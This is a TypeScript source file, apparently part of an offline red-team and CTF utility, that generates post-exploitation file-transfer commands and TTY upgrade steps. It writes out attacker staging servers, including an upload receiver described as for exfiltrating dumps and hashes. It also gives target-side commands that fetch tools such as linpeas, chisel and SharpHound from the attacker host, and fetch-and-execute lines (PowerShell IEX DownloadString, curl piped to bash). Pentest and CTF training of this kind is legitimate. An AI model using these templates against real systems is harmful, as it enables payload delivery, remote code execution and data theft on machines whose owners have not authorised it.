/**
 * ZeroBox Pure Offline Offensive File Transfer & TTY Utilities
 * Standardized staging listeners and target download commands for Red Team & CTF operations.
 */
import { shellQuote } from './shellEncoders';

export const COMMON_TRANSFER_TOOLS = [
  'linpeas.sh',
  'winPEASx64.exe',
  'ligolo-agent',
  'chisel',
  'pspy64',
  'SharpHound.exe',
] as const;

export type CommonTransferTool = (typeof COMMON_TRANSFER_TOOLS)[number];

export interface FileTransferMethod {
  id: string;
  os: 'windows' | 'linux' | 'universal' | 'server';
  category: 'download' | 'upload' | 'server' | 'in-memory';
  title: string;
  description: string;
  commandTemplate: string;
}

export interface FileTransferOptions {
  lhost: string;
  lport: string | number;
  filename: string;
  targetIp?: string;
  user?: string;
  cred?: string;
}

/** Double-quote a value for Windows cmd.exe copy-paste (strips CR/LF, doubles embedded "). */
function winDoubleQuote(s: string): string {
  const clean = (s ?? '').replace(/[\r\n]/g, '');
  return `"${clean.replace(/"/g, '""')}"`;
}

export function generateFileTransferMethods(opts: FileTransferOptions): FileTransferMethod[] {
  const { lhost, lport, filename, targetIp = '10.10.10.X', user = 'kali', cred = 'kali' } = opts;
  const safeFile = (filename.trim() || 'tools.exe');
  if (!/^[A-Za-z0-9._-]+$/.test(safeFile)) throw new Error('Invalid filename');
  const portNum = Number(String(lport).trim());
  if (!Number.isInteger(portNum) || portNum < 1 || portNum > 65535) throw new Error('Invalid lport');
  const encodedFile = encodeURIComponent(safeFile);
  const qFile = shellQuote(safeFile);
  const qTmpFile = shellQuote(`/tmp/${safeFile}`);
  const qUser = shellQuote((user ?? '').trim() || 'kali');
  const qCred = shellQuote((cred ?? '').trim() || 'kali');
  const wCred = winDoubleQuote((cred ?? '').trim() || 'kali');
  const wUser = winDoubleQuote((user ?? '').trim() || 'kali');
  const wSafeFile = `"${safeFile}"`;
  const wUncFile = `"\\\\${lhost}\\tools\\${safeFile}"`;
  const wUncDest = `"C:\\temp\\${safeFile}"`;

  return [
    // --- Attacker Staging Servers ---
    {
      id: 'srv-http-py3',
      os: 'server',
      category: 'server',
      title: 'Python 3 HTTP Staging Server',
      description: `Host current directory over HTTP port ${portNum} serving ${safeFile}.`,
      commandTemplate: `python3 -m http.server ${portNum}`,
    },
    {
      id: 'srv-smb-impacket',
      os: 'server',
      category: 'server',
      title: 'Impacket SMB Server (SMB2)',
      description: `Host local directory as SMB share "tools" with SMB2 enabled.`,
      commandTemplate: `impacket-smbserver tools "$(pwd)" -smb2support -username ${qUser} -password ${qCred}`,
    },
    {
      id: 'srv-upload-py',
      os: 'server',
      category: 'server',
      title: 'Python Upload Receiver (uploadserver)',
      description: `Accept HTTP POST uploads from targets (e.g. exfiltrating dumps/hashes).`,
      commandTemplate: `python3 -m uploadserver ${portNum}`,
    },
    {
      id: 'srv-ftp-py',
      os: 'server',
      category: 'server',
      title: 'Python Writable FTP Server (pyftpdlib)',
      description: `Standalone writeable FTP listener for non-interactive downloads.`,
      commandTemplate: `python3 -m pyftpdlib -p 21 -w -u ${qUser} -P ${qCred}`,
    },

    // --- Windows Targets ---
    {
      id: 'win-certutil',
      os: 'windows',
      category: 'download',
      title: 'CertUtil Cache Split (Windows)',
      description: `Native binary download using certutil.exe; leaves cache artifacts.`,
      commandTemplate: `certutil -urlcache -split -f "http://${lhost}:${portNum}/${encodedFile}" ${wSafeFile}`,
    },
    {
      id: 'win-ps-iwr',
      os: 'windows',
      category: 'download',
      title: 'PowerShell Invoke-WebRequest (iwr)',
      description: `Standard PowerShell 3+ file download directly saving to disk.`,
      commandTemplate: `powershell -c "Invoke-WebRequest -Uri 'http://${lhost}:${portNum}/${encodedFile}' -OutFile '${safeFile}'"`,
    },
    {
      id: 'win-ps-webclient',
      os: 'windows',
      category: 'download',
      title: 'PowerShell WebClient DownloadFile',
      description: `Low-profile legacy .NET WebClient download (PowerShell 2.0 compatible).`,
      commandTemplate: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${lhost}:${portNum}/${encodedFile}', '${safeFile}')"`,
    },
    {
      id: 'win-ps-iex',
      os: 'windows',
      category: 'in-memory',
      title: 'PowerShell In-Memory Download & Execute (IEX)',
      description: `Fetch and execute remote script in memory without touching target disk.`,
      commandTemplate: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${portNum}/${encodedFile}')"`,
    },
    {
      id: 'win-smb-copy',
      os: 'windows',
      category: 'download',
      title: 'Windows SMB UNC Direct Copy',
      description: `Mount and copy file directly from attacker SMB share over port 445.`,
      commandTemplate: `net use \\\\${lhost}\\tools ${wCred} /user:${wUser} && copy ${wUncFile} ${wUncDest}`,
    },
    {
      id: 'win-bitsadmin',
      os: 'windows',
      category: 'download',
      title: 'Bitsadmin Background Transfer',
      description: `Native Windows background intelligent transfer service (BITS).`,
      commandTemplate: `bitsadmin /transfer job /download /priority normal http://${lhost}:${portNum}/${encodedFile} ${wUncDest}`,
    },

    // --- Linux Targets ---
    {
      id: 'lin-curl-out',
      os: 'linux',
      category: 'download',
      title: 'Linux cURL File Download',
      description: `Fetch binary and mark as executable in one command.`,
      commandTemplate: `curl -s -L "http://${lhost}:${portNum}/${encodedFile}" -o ${qFile} && chmod +x ${qFile}`,
    },
    {
      id: 'lin-curl-pipe',
      os: 'linux',
      category: 'in-memory',
      title: 'Linux cURL Pipe to Shell (In-Memory)',
      description: `Stream script from staging server directly into bash process.`,
      commandTemplate: `curl -s "http://${lhost}:${portNum}/${encodedFile}" | bash`,
    },
    {
      id: 'lin-wget',
      os: 'linux',
      category: 'download',
      title: 'Linux Wget Download',
      description: `Download payload to /tmp directory and make executable.`,
      commandTemplate: `wget "http://${lhost}:${portNum}/${encodedFile}" -O ${qTmpFile} && chmod +x ${qTmpFile}`,
    },
    {
      id: 'lin-dev-tcp',
      os: 'linux',
      category: 'download',
      title: 'Bash /dev/tcp Raw Socket Transfer',
      description: `Living-off-the-land HTTP download using pure bash sockets without curl/wget.`,
      commandTemplate: `exec 3<>/dev/tcp/${lhost}/${portNum}; echo -e "GET /${encodedFile} HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 > ${qTmpFile}`,
    },
    {
      id: 'lin-nc-rx',
      os: 'linux',
      category: 'download',
      title: 'Netcat TCP Pipe Transfer',
      description: `Listen on target port 9001 and receive direct raw stream from attacker.`,
      commandTemplate: `nc -lvnp 9001 > ${qTmpFile}  # Attacker sends: nc -vn ${targetIp} 9001 < ${qFile}`,
    },
    {
      id: 'lin-base64',
      os: 'linux',
      category: 'download',
      title: 'Base64 Clipboard Echo Transfer',
      description: `Transfer small script/binary across terminal copy-paste without outbound network.`,
      commandTemplate: `cat ${qFile} | base64 -w 0  # Paste on target: echo "<BASE64>" | base64 -d > ${qFile}`,
    },
  ];
}

export interface TtyUpgradeStep {
  step: number;
  title: string;
  command: string;
  explanation: string;
  isKeystroke?: boolean;
}

export interface TtyUpgradeOptions {
  rows?: number;
  cols?: number;
}

export function generateTtyStabilizationSteps(opts?: TtyUpgradeOptions): TtyUpgradeStep[] {
  const rows = opts?.rows ?? 38;
  const cols = opts?.cols ?? 116;

  return [
    {
      step: 1,
      title: 'Spawn PTY in Catch Shell',
      command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
      explanation: 'Invokes Python pty module to allocate pseudo-terminal. If Python 3 is missing, try python or /usr/bin/script -qc /bin/bash /dev/null.',
    },
    {
      step: 2,
      title: 'Background Netcat Shell',
      command: `Ctrl + Z`,
      explanation: 'Sends SIGTSTP to suspend the current netcat session and drop back to your local attacker terminal.',
      isKeystroke: true,
    },
    {
      step: 3,
      title: 'Raw Mode & Foreground Job',
      command: `stty raw -echo; fg`,
      explanation: 'Disables terminal echo and line buffering on your local terminal, then returns netcat to the foreground (press ENTER twice if prompt does not appear).',
    },
    {
      step: 4,
      title: 'Set Terminal Profile & Shell',
      command: `export TERM=xterm-256color; export SHELL=/bin/bash`,
      explanation: 'Enables clear, nano, top, arrows, history and full color support inside the remote shell.',
    },
    {
      step: 5,
      title: 'Set Rows & Columns (Fix wrap)',
      command: `stty rows ${rows} columns ${cols}`,
      explanation: `Matches remote shell window boundaries to avoid line wrapping glitches. (Run 'stty size' locally to verify exact values).`,
    },
  ];
}
